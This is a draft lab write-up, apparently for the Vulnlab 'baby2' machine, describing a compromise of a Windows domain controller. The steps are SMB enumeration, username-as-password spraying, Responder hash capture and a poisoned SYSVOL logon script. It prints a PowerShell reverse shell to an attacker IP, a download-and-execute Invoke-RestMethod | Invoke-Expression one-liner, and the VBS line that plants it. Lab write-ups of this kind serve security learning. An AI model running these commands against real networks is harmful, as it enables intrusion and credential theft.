+++
title = '[Vulnlab] baby2'
date = 2024-10-06T21:36:11+02:00
draft = true
tags = ['pentesting']
+++

# Summary
## Relevant information
* usernames 
* Writable SYSVOL folder, login script in bloodhound

## Time sinks
Collection on things that took too much time.
* Debugging broken powershell tool -> Use this [Gist](https://gist.githubusercontent.com/egre55/c058744a4240af6515eb32b2d33fbed3/raw/3ad91872713d60888dca95850c3f6e706231cb40/powershell_reverse_shell.ps1)
* Abusing DACL -> Lookup on [Hacker recipes](https://www.thehacker.recipes/ad/movement/dacl/)

## Tools used -> Broken tools
I started using [exegol](https://exegol.readthedocs.io/en/latest/) instead of torturing myself with Debian.
This means that I don't have to be so frugal with installing tools and can just YOLO :D
Instead I'll rant about broken tools in `exegol:full`

* Broken powershell reverse shell generators
  * `shellator` Powershell reverse shell does not work: [Github issue](https://github.com/ShutdownRepo/shellerator/issues/14) 
  * Same story for [revshells.com](https://www.revshells.com/) and their powershell reverse shells, someone already posted a [Github issue](https://github.com/0dayCTF/reverse-shell-generator/issues/156) 
  * **Solution:** Use this [Gist](https://gist.githubusercontent.com/egre55/c058744a4240af6515eb32b2d33fbed3/raw/3ad91872713d60888dca95850c3f6e706231cb40/powershell_reverse_shell.ps1) from [*Nikhil SamratAshok Mittal*](https://github.com/samratashok)



# Walkthrough

Windows Machine! Let's check the names!
```bash
$ nxc smb "$IP"
SMB         10.10.106.56    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
```
It's a Windows Server 2022, so pretty new.

The fast `nmap` scan reveals the typical suspects.

```
$ nmap -F $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-06 21:44 CEST
Nmap scan report for baby2.vl (10.10.106.56)
Host is up (0.025s latency).
Not shown: 93 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```
A domain controller with RDP but not much else going on. 
Let's try the tried and true approach:
1. Get usernames
2. Get a domain user
3. Enumeration: Bloodhound, SMB, LDAP, ...
4. ???
5. RCE
6. More bloodhoung or privesc shenanigans
7. Profit
Let's start getting some usernames.

## 1. Username enumeration
LDAP Server NULL bind did not work:
```bash
nxc ldap "$DC_HOST" -u anonymous -p ''
[...]
LDAP[...] [-] Error in searchRequest [...]
```
But we have anonymous login on SMB!
```bash
smbmap -u guest -H "$TARGET"
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authentidated session(s)

[+] IP: 10.10.106.56:445        Name: DC.baby2.vl               Status: Authenticated
        Disk             Permissions     Comment
        ----             -----------     -------
        ADMIN$           NO ACCESS       Remote Admin
        apps             READ ONLY
        C$               NO ACCESS       Default share
        docs             NO ACCESS
        homes            READ, WRITE
        IPC$             READ ONLY       Remote IPC
        NETLOGON         READ ONLY       Logon server share
        SYSVOL           NO ACCESS       Logon server share
```
The homes directory looks like it will give us some usernames.
Also don't trust the Permissions! Folders within the shares can be configured differently.
(Important later).

And here is the username list!
```bash
$ smbclient.py a@"$TARGET" -no-pass
Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs

Type help for list of commands
# use homes
# ls
drw-rw-rw-          0  Sun Oct  6 21:59:26 2024 .
drw-rw-rw-          0  Tue Aug 22 22:10:21 2023 ..
drw-rw-rw-          0  Tue Aug 22 22:18:40 2023 Amelia.Griffiths
drw-rw-rw-          0  Tue Aug 22 22:18:40 2023 Carl.Moore
drw-rw-rw-          0  Tue Aug 22 22:18:40 2023 Harry.Shaw
drw-rw-rw-          0  Tue Aug 22 22:18:40 2023 Joan.Jennings
drw-rw-rw-          0  Tue Aug 22 22:18:40 2023 Joel.Hurst
drw-rw-rw-          0  Tue Aug 22 22:18:40 2023 Kieran.Mitchell
drw-rw-rw-          0  Sat Sep  2 16:45:25 2023 library
drw-rw-rw-          0  Tue Aug 22 22:18:40 2023 Lynda.Bailey
drw-rw-rw-          0  Tue Aug 22 22:18:40 2023 Mohammed.Harris
drw-rw-rw-          0  Tue Aug 22 22:18:40 2023 Nicola.Lamb
drw-rw-rw-          0  Tue Aug 22 22:18:40 2023 Ryan.Jenkins
```
## 2. Domain user: Good old username = password
```bash
$ nxc smb "$IP" -u users.txt -p users.txt --no-bruteforce --continue-on-success
SMB     [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
SMB     [-] baby2.vl\Amelia.Griffiths:Amelia.Griffiths STATUS_LOGON_FAILURE
SMB     [+] baby2.vl\Carl.Moore:Carl.Moore
SMB     [-] baby2.vl\Harry.Shaw:Harry.Shaw STATUS_LOGON_FAILURE
SMB     [-] baby2.vl\Joan.Jennings:Joan.Jennings STATUS_LOGON_FAILURE
SMB     [-] baby2.vl\Joel.Hurst:Joel.Hurst STATUS_LOGON_FAILURE
SMB     [-] baby2.vl\Kieran.Mitchell:Kieran.Mitchell STATUS_LOGON_FAILURE
SMB     [+] baby2.vl\library:library
SMB     [-] baby2.vl\Lynda.Bailey:Lynda.Bailey STATUS_LOGON_FAILURE
SMB     [-] baby2.vl\Mohammed.Harris:Mohammed.Harris STATUS_LOGON_FAILURE
SMB     [-] baby2.vl\Nicola.Lamb:Nicola.Lamb STATUS_LOGON_FAILURE
SMB     [-] baby2.vl\Ryan.Jenkins:Ryan.Jenkins STATUS_LOGON_FAILURE
```
Wow 2 users! `Carl.Moore:Carl.Moore` and `library:library`

## 3. Enumeration, enumeration, enumeration -> Writable SYSVOL share
Now we have a domain user so even more information awaits. (Both users don't appear to differ in any meaningful way)

Let's look at the shares again, I only marked the interesting changed ones:
```bash
$ USER=library PASSWORD=library
$ smbmap -u $USER -p $PASSWORD -H $TARGET
[+] IP: 10.10.106.56:445        Name: DC.baby2.vl               Status: Authenticated
        Disk            Permissions     Comment
        ----            -----------     -------
        [...]
        apps            READ, WRITE
        docs            READ, WRITE
        SYSVOL          READ ONLY       Logon server share
```
`docs` is actually empty, but apps contains an interesting `CHANGELOG` and a `login.vbs.lnk` file:

```bash
smbclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
# use apps
# ls
drw-rw-rw-          0  Thu Sep  7 21:20:13 2023 dev
# cd dev
# ls
drw-rw-rw-          0  Thu Sep  7 21:20:13 2023 .
drw-rw-rw-          0  Sun Oct  6 22:14:53 2024 ..
-rw-rw-rw-        108  Thu Sep  7 21:20:13 2023 CHANGELOG
-rw-rw-rw-       1800  Thu Sep  7 21:20:13 2023 login.vbs.lnk
# get login.vbs.lnk
# cat CHANGELOG
```

> [0.2]
> 
> - Added automated drive mapping
> 
> [0.1]
> 
> - Rolled out initial version of the domain logon script

The `login.vbs.lnk` file is a Windows shortcut. With `strings` we can see where it points to:
```bash
$ strings login.vbs.lnk
[...]
C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\
```

### Explanation: Logon scripts
So I found this wonderful [german Article](https://sid-500.com/2017/04/29/logon-skript-erstellen-active-directory/) from *Patrick Gruenauer* explaining Logon Scripts.
Since german is such a wonderful language I expect everyone to learn it.
(Just kidding, use your browser inbuilt translation tool).

What we are interested in is:
* Logon scripts are usually stored in the `SYSVOL` Share
* Logon scripts can be either pinned to a user or defined as a Group policy
* If we can overwrite the script, we get code execution when the user logs in

A quick bloodhound check will give us a clue:
```bash
$ bloodhound.py --zip -c All -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -ns $IP
[...]
```
After clicking through diffent users, we see that `Amelia.Griffiths` has the 
login script.
![Logon Script](/images/vulnlab_baby2/logonscript.png)


### Exploiting the logon script
So we know that the login script is 
```bash
$ smbclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
Impacket v0.12.0.dev1+20240502.235035.cb8467c - Copyright 2023 Fortra

Type help for list of commands
# use SYSVOL
# cd baby2.vl/scripts
# ls
drw-rw-rw-          0  Tue Aug 22 21:28:27 2023 .
drw-rw-rw-          0  Tue Aug 22 19:43:55 2023 ..
-rw-rw-rw-        992  Sat Sep  2 16:55:51 2023 login.vbs
# get login.vbs
# cat login.vbs
Sub MapNetworkShare(sharePath, driveLetter)
[...]

MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"
```

Ughh, VBA. This is going to be a debugging disaster (it was not, but the powershell reverse shell was).
Here is now the steps to prevent future catastrophes:
1. Check if script is executed by using inbuild `MapNetworkShare`
2. Test reverseshell locally
3. Create a 2-stage reverse shell that first downloads the payload from a webserver and then executes it. This way, we can see if the download failed or the payload.
4. Upload it and pray

#### 1. Check if script is executed
To see if the script actuall gets executed we start a `Responder.py` 
```bash
Responder.py --interface "tun0"
```
and then add a line so the target tries to connect to our "smbshare"
```bash
$ cat login.vbs
...
MapNetworkShare "\\10.8.3.211\X", "X"
```
and upload it:
```bash
smbclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
Impacket v0.12.0.dev1+20240502.235035.cb8467c - Copyright 2023 Fortra

Type help for list of commands
# use SYSVOL
# cd baby2.vl/scripts
# put login.vbs
```

It works! Our Responder got a connection:
```
[SMB] NTLMv1-SSP Client   : 10.10.106.56
[SMB] NTLMv1-SSP Username : BABY2\Amelia.Griffiths
[SMB] NTLMv1-SSP Hash     : Amelia.Griffiths::BABY2:57B3E76E5BD1236D00000000000000000000000000000000:037BF719B5AE04B001A3804B77CBFDD6BE826D9B5101B972:1122334455667788
```
We could try to crack the hash, but it doesn't work.
Instead we have to upload a Reverse shell.

#### 2. Test reverse shell
First we download a [reverse shell](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3). And then change the first parameters to out LHOST and LPORT:

```powershell
$ cat rev.ps1
$client = New-Object System.Net.Sockets.TCPClient('10.8.3.211',443);[...]
```
Now we want to make sure that it works, so we DON'T LOSE TOO MUCH TIME.
Then we create a listener 
```bash
$ nc -lnvp 443
```
and run the script in a different terminal:
```bash
$ powershell rev.ps1
```

And it works!

```bash
Ncat: Connection from 10.8.3.211.
Ncat: Connection from 10.8.3.211:33594.
```
#### 3. Two-Stage reverse shell
To assist in debugging and having a shorter payload, the script will download the payload 
from our server and then execute it. The command is:
```bash
Invoke-RestMethod http://10.8.3.211/rev.ps1 | Invoke-Expression
```
For that we start a http-server on port 80
```bash
python3 -m http.server 80
```
And test it again locally :D
```powershell
$ powershell
powershell -c 'Invoke-RestMethod http://10.8.3.211/rev.ps1 | Invoke-Expression'
```
Our server reports that the file is loaded
```bash
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.8.3.211 - - [06/Oct/2024 23:28:18] "GET /rev.ps1 HTTP/1.1" 200 -
```
And we also get the reverse shell:
```bash
$ nc -lnvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.8.3.211.
Ncat: Connection from 10.8.3.211:58048.
PS /workspace>
```

#### 4. Profit!
Now to do that on the live machine. There is even a nice [Stackoverflow Discussion](https://stackoverflow.com/questions/11448365/running-powershell-from-vbs-with-command-as-parameter)
that explains how we do that in VBA:

```bash
$ tail login.vbs

MapNetworkShare "\\10.8.3.211\X", "X"

CreateObject("Wscript.SheLL").Run "powershell -c 'Invoke-RestMethod http://10.8.3.211/rev.ps1 | Invoke-Expression'"
```

Now we do the following steps:
1. Start `http.server`
2. Start netcat listener
3. Upload login.vbs script

If everything works as intended we will get a reverse shell! 
Otherwise, we can check our output and fix it.
1. Responder not reached -> we broke the script
2. Webserver has never been reached -> powershell Invoke-RestMethod didn't work
3. Webserver has been reached -> `rev.ps1` broken?

